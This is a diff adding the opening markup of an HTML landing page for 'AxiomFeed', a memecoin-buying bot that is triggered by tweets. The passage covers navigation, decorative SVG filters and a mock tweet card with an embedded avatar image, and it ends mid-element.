@@ -1,0 +1,470 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>AxiomFeed — Front-Run the Timeline</title>
+  <meta name="description"
+    content="AxiomFeed watches the accounts that move memecoins and fires the moment they post. Reads the CA from the tweet, buys through Axiom before the reply guys even refresh." />
+  <link rel="icon" type="image/png" href="axiom-icon.png" />
+  <link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpolygon points='12,2 17,11 7,11' fill='%23ffffff'/%3E%3Cpolygon points='6,13 18,13 22,21 2,21' fill='%23ffffff'/%3E%3C/svg%3E" />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&family=Space+Grotesk:wght@500;600;700&display=swap"
+  rel="stylesheet" />
+  <link rel="stylesheet" href="style.css" />
+</head>
+
+<body>
+
+  <!-- SVG filters for clean outlined headline text -->
+  <svg width="0" height="0" style="position:absolute" aria-hidden="true" focusable="false">
+    <defs>
+      <filter id="outlineFx" x="-3%" y="-12%" width="106%" height="124%" color-interpolation-filters="sRGB">
+        <feMorphology in="SourceAlpha" operator="dilate" radius="1.4" result="grown" />
+        <feComposite in="grown" in2="SourceAlpha" operator="out" result="ring" />
+        <feFlood flood-color="#7b7b7e" />
+        <feComposite in2="ring" operator="in" />
+      </filter>
+      <filter id="outlineWm" x="-2%" y="-6%" width="104%" height="112%" color-interpolation-filters="sRGB">
+        <feMorphology in="SourceAlpha" operator="dilate" radius="1" result="grown" />
+        <feComposite in="grown" in2="SourceAlpha" operator="out" result="ring" />
+        <feFlood flood-color="#ffffff" flood-opacity=".1" />
+        <feComposite in2="ring" operator="in" />
+      </filter>
+      <filter id="outlineFxHi" x="-3%" y="-12%" width="106%" height="124%" color-interpolation-filters="sRGB">
+        <feMorphology in="SourceAlpha" operator="dilate" radius="1.4" result="grown" />
+        <feComposite in="grown" in2="SourceAlpha" operator="out" result="ring" />
+        <feFlood flood-color="#b4b4b8" />
+        <feComposite in2="ring" operator="in" />
+      </filter>
+    </defs>
+  </svg>
+
+  <!-- global background: grid squares + glow + watermark, behind every page -->
+  <div class="site-bg" aria-hidden="true">
+    <div class="site-bg-grid"></div>
+  </div>
+
+  <!-- page transition overlay -->
+  <div class="pt" id="pageTransition" aria-hidden="true">
+    <div class="pt-pill">
+      <span class="pt-brand">
+        <svg viewBox="0 0 24 24" aria-hidden="true">
+          <polygon points="12,2 17,11 7,11" fill="#fff" />
+          <polygon points="6,13 18,13 22,21 2,21" fill="#fff" />
+        </svg>
+        AXIOMFEED
+      </span>
+      <span class="pt-label" id="ptLabel">Loading</span>
+      <span class="pt-bar"><i></i></span>
+    </div>
+  </div>
+
+  <!-- nav -->
+  <header class="nav">
+    <div class="wrap nav-in">
+      <a class="brand-wrap" href="#" onclick="showHome(event)">
+        <span class="brand-core">
+          <svg class="axiom-logo-mark" viewBox="0 0 24 24" width="22" height="22" aria-label="Axiom logo">
+            <polygon points="12,2 17,11 7,11" fill="#ffffff" />
+            <polygon points="6,13 18,13 22,21 2,21" fill="#ffffff" />
+          </svg>
+          <span class="brand-mark">AXIOM<span>FEED</span></span>
+        </span>
+        <span class="brand-badge">Twitter Tracker</span>
+      </a>
+      <nav class="links">
+        <a class="lnk" href="#features">Features</a>
+        <a class="lnk" href="#how">How It Works</a>
+        <a class="lnk" href="#faq">FAQ</a>
+        <a href="#" id="navTrackerBtn" class="btn btn-primary"
+          style="padding:10px 20px;font-size:13.5px;border-radius:9px" onclick="showSetup(event)">Explore features</a>
+      </nav>
+    </div>
+  </header>
+
+  <!-- MAIN HOME VIEW -->
+  <div id="homeView" class="view-panel active">
+    <!-- hero -->
+    <section class="hero">
+      <div class="hero-bg" aria-hidden="true"></div>
+      <div class="hero-word" aria-hidden="true">AXIOM</div>
+      <div class="wrap">
+        <div class="hero-inner">
+
+          <!-- LEFT COLUMN: Tweet + Tracker Cards -->
+          <div class="reveal slide-l">
+            <div class="card-stack">
+              <div class="tweet-card" id="tweetCard">
+                <div class="tc-head">
+                  <div class="tc-av"><img
+                      src="data:image/jpeg;base64,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"
+                      alt="Murad" onerror="this.remove()">M</div>
+                  <div>
+                    <div class="tc-name">Murad
+                      <svg viewBox="0 0 24 24" fill="#fff" aria-label="X">
+                        <path
+                          d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
+                      </svg>
+                    </div>
+                    <div class="tc-handle">@muradonx · 16h</div>
+                  </div>
+                  <div class="tc-more">···</div>
+                </div>
+                <div class="tc-body">
+                  ngl been quietly stacking this one all week not saying anything else, you'll see
+                </div>
+                <div class="tc-pills">
+                  <span class="tc-pill">$WIZARD</span>
+                  <span class="tc-pill">8xWzrdK4v2mNpQ7Rftx13yhR81s3ruM3rPvTGpump</span>
+                </div>
+                <div class="tc-metrics">
+                  <span class="tc-met"><svg viewBox="0 0 24 24" fill="currentColor">
+                      <path
+                        d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z" />
+                    </svg> 428</span>
+                  <span class="tc-met tc-retweet"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                      stroke-width="2">
+                      <path d="m17 2 4 4-4 4" />
+                      <path d="M3 11v-1a4 4 0 0 1 4-4h14" />
+                      <path d="m7 22-4-4 4-4" />
+                      <path d="M21 13v1a4 4 0 0 1-4 4H3" />
+                    </svg> 2.1K</span>
+                  <span class="tc-met tc-like"><svg viewBox="0 0 24 24" fill="currentColor">
+                      <path
